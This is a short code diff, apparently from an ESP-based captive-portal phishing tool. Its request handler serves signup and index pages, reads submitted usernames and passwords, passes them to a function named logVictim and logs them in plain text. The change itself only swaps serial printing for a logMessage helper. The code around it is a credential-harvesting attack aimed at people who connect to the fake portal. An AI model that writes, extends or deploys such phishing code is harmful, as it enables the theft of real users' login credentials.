@@ -18,7 +18,7 @@ public:
         // Handle requests to /signup
         if (request->url().equalsIgnoreCase("/signup"))
         {
-            Serial.println("Got signup web req");
+            logMessage("Got signup web req");
             request->send_P(200, "text/html", signup_html);
             return;   
         }
@@ -30,15 +30,15 @@ public:
         {
             inputUsername = request->getParam("username")->value();
             inputPassword = request->getParam("password")->value();
-            Serial.println("Got username: " + inputUsername);
-            Serial.println("Got password: " + inputPassword);
+            logMessage("Got username: " + inputUsername);
+            logMessage("Got password: " + inputPassword);
             logVictim(inputUsername, inputPassword);
             request->send_P(200, "text/html", success_html);
             
         }
         else
         {
-            Serial.println("Got index web req");
+            logMessage("Got index web req");
             {
                 request->send_P(200, "text/html", index_html);
             }
